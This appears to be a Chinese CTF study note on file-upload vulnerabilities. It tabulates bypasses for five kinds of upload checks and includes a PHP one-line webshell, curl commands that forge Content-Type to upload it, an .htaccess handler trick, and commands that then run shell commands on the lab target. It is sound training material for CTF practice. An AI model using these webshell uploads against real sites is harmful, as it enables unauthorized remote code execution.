# 🗂 Web 笔记 21｜文件上传解题手册（五类校验 + 绕过 + 已打题）

> 记录自：qsnctf 上传题 ×2（40253/40287）+ DT's day ｜ 2026-08-12
> 适用：所有文件上传题（Avatar/头像/附件/图片上传...）
> 一句话：上传题 = 「看服务器信什么 → 伪造什么」

---

## 一、上传题本质

上传文件 = 让服务器**接收并保存**一个文件。漏洞 = 服务器**校验不严**，让攻击者能传「能执行的文件」（PHP 马等）。

**核心心法**：服务器校验靠「客户端声明」的东西（JS/Content-Type/扩展名/文件头）——**只要它信了可伪造的声明，就能绕**。

---

## 二、五类校验 + 绕过速查表（★核心）

| # | 校验类型 | 拦什么 | 绕过方式 | 打过吗 |
|---|---|---|---|---|
| 1 | **前端 JS** | 浏览器弹窗拦扩展名 | curl/Burp 直接发请求，不经过 JS | ✅ 40253 |
| 2 | **Content-Type** | `image/jpeg/png` 类型 | `;type=image/jpeg` 伪造 | ✅ 40287 |
| 3 | **扩展名黑名单** | 拦 .php | .php5/.phtml/.pht/.htaccess/大小写 .PhP/双写 p.phphp | ⏳ 待打 |
| 4 | **文件头魔数** | 拦「不是图片」 | 图片马：`GIF89a`/`FFD8FF`/`PNG` + PHP 代码 | ⏳ 待打 |
| 5 | **内容+MD5** | 两文件内容/MD5 | fastcoll 碰撞对 | ✅ DT's day |

> 补充技巧：**.htaccess 上传**（`AddType application/x-httpd-php .jpg`）能让 Apache 把图片当 PHP 解析——专治「图片马传上去不执行」。

---

## 三、标准做题流程（三步）

```
① 直接传 .php 看反应：
   成功       → 前端校验或后端不拦 → 无脑 getshell
   被 302 拦  → 看提示判断拦什么（见速查表对号入座）
② 传成功看回显路径（path: ./upload/xxx）→ 访问验证执行
③ RCE 后：ls / → 找 flag 文件 → cat
```

**判断拦截信息的口诀**：
- 「只允许JPEG/PNG」→ Content-Type 校验 → `;type=`
- 「.php 不允许」→ 扩展名黑名单 → 换扩展名/.htaccess
- 「不是图片」→ 文件头校验 → 图片马
- 「文件非法」→ 内容校验 → 图片马或碰撞

---

## 四、两题实战对比（打过的）

| | 40253 | 40287 |
|---|---|---|
| 校验 | 前端 JS（.jpg/.png/.gif） | 后端 Content-Type（JPEG/PNG） |
| 直接传 .php | ✅ 成功 | ❌ 302 拦截 |
| 绕过 | curl 直接传 | `;type=image/jpeg` 伪造 |
| 落点 | /upload/shell.php | /uploads/shell.php |
| flag | flag{3ed4f64a8ea148e986d234db820a0dce} | flag{a642601c1bfd40e097783005b6eeb578} |

**关键命令**：
```bash
# 40253（前端 JS）：直接传
printf '<?php system($_GET["c"]); ?>' > shell.php
curl -F "upload_file=@shell.php" -F "submit=上传" http://靶机/

# 40287（Content-Type）：伪造类型
printf '<?php system($_GET["c"]); ?>' > shell.php
curl -F "file=@shell.php;filename=shell.php;type=image/jpeg" -F "submit=Upload" http://靶机/upload.php
```

---

## 五、getshell 后（统一动作）

```bash
curl "http://靶机/路径/shell.php?c=id"            # 验证 RCE
curl "http://靶机/路径/shell.php?c=ls%20-la%20/"  # 看根目录
curl "http://靶机/路径/shell.php?c=cat%20/flag"   # 读 flag
# flag 文件可能改名（ffffffllllaaaagg），ls 要仔细看
```

---

## 六、速查卡（贴墙）

```
上传题流程: 传 .php 看反应 → 按拦截信息对号入座 → 回显路径 → 访问执行 → cat flag
前端 JS:    curl 直接绕（根本不经过）
Content-Type: ;type=image/jpeg 伪造
扩展名黑名单: .php5/.phtml/.htaccess/大小写
文件头:     GIF89a / FFD8FF / PNG + <?php ... ?>
内容MD5:    fastcoll 碰撞对
不执行:     .htaccess 加 AddType application/x-httpd-php .jpg
核心:       服务器信什么可伪造的，就伪造什么
```
